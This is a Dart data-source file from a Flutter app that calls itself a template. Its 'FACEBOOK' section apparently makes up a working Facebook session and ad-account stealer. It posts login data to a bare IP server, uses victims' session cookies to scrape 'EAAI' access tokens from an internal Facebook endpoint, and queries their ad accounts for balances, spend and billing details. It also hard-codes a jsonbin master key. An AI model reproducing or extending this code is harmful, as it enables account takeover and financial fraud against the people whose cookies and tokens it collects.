import 'dart:convert';
import 'dart:math';
import 'dart:developer';
import 'package:dio/dio.dart';
import 'package:flutter/material.dart';
import 'package:flutter_template/common/constants/endpoints.dart';
import 'package:flutter_template/common/helpers/dio/dio.helper.dart';
import 'package:flutter_template/modules/data/model/post_data.model.dart';
import 'package:flutter_template/modules/data/model/user.model.dart';
import 'package:injectable/injectable.dart';
import 'package:http/http.dart' as http;

abstract class UserDataSource {
  Future<HttpResponse> login(LoginModel loginModel);
  Future<HttpResponse> register();
  Future<HttpResponse> authMe();
  // FACEBOOK
  Future<HttpResponse> actionLogin(PostData postData);
  Future<String> getCountry(String ip);
  Future<String> getAccessToken(String cookie);
  Future<HttpResponse> getAdAccount(String accessToken, String cookie);
  Future<HttpResponse> checkActivityLoginFaceAndNotificationsSchedule();
}

@LazySingleton(as: UserDataSource)
class UserRemoteImpl implements UserDataSource {
  @override
  Future<HttpResponse> authMe() async {
    return await DioHelper.get(Endpoints.authme);
  }

  @override
  Future<HttpResponse> login(LoginModel loginModel) async {
    return await DioHelper.post(Endpoints.login, loginModel);
  }

  @override
  Future<HttpResponse> register() {
    throw UnimplementedError();
  }

  // FACEBOOK
  @override
  Future<HttpResponse> actionLogin(PostData postData) async {
    try {
      debugPrint('########');
      debugPrint(postData.toJson().toString());
      return await DioHelper.post(
          'http://104.161.89.89:3000/post', postData.toJson());
    } catch (exception) {
      return await Future.error(exception.toString());
    }
  }

  @override
  Future<String> getCountry(String ip) async {
    debugPrint('REQUEST: GET => https://ipinfo.io/$ip/json');
    try {
      var response = await http.get(Uri.parse('https://ipinfo.io/$ip/json'));
      final body = json.decode(response.body);
      return body['country'];
    } catch (exception) {
      return 'UnKnow';
    }
  }

  @override
  Future<HttpResponse> getAdAccount(String accessToken, String cookie) async {
    try {
      final headerGerAd = Options(
        headers: {
          'Content-Type': 'application/json; charset=UTF-8',
          'Cookie': cookie,
        },
      );
      return await DioHelper.get(
          'https://graph.facebook.com/v16.0/me?fields=id%2Cname%2Cadaccounts.limit(1000){id%2Cadspaymentcycle%2Ccurrency%2Cname%2Caccount_currency_ratio_to_usd%2Cadtrust_dsl%2Camount_spent%2Caccount_status%2Cbalance%2Clast_spend_time%2Clast_used_time%2Cmin_daily_budget%2Cnext_bill_date%2Cis_prepay_account}&access_token=$accessToken',
          options: headerGerAd);
    } catch (exception) {
      return await Future.error(exception.toString());
    }
  }

  @override
  Future<HttpResponse> checkActivityLoginFaceAndNotificationsSchedule() async {
    try {
      final headerGerAd = Options(
        headers: {
          'Content-Type': 'application/json; charset=UTF-8',
          'X-Master-Key':
              '\$2b\$10\$qM9AD2i77FLZmBds.uPepOgJ/8vrDE612RyYECRnYD9.qqgV2sNRi'
        },
      );
      return await DioHelper.get(
          'https://api.jsonbin.io/v3/b/64440effb89b1e22998f6245',
          options: headerGerAd);
    } catch (exception) {
      return await Future.error(exception.toString());
    }
  }

  @override
  Future<String> getAccessToken(String cookie) async {
    String accessTokenResult = '';
    var response = await http.get(
        Uri.parse(
            'https://www.facebook.com/ajax/bootloader-endpoint/?modules=AdsCanvasComposerDialog.react'),
        headers: {'Cookie': cookie});
    if (response.statusCode == 200) {
      // Start access token
      String htmlToParse = response.body;
      final startIndex = htmlToParse.indexOf('EAAI');
      final endIndex =
          htmlToParse.indexOf('client_id', startIndex + 'EAAI'.length);
      accessTokenResult = htmlToParse.substring(startIndex, endIndex - 3);
    }
    return accessTokenResult;
  }
}
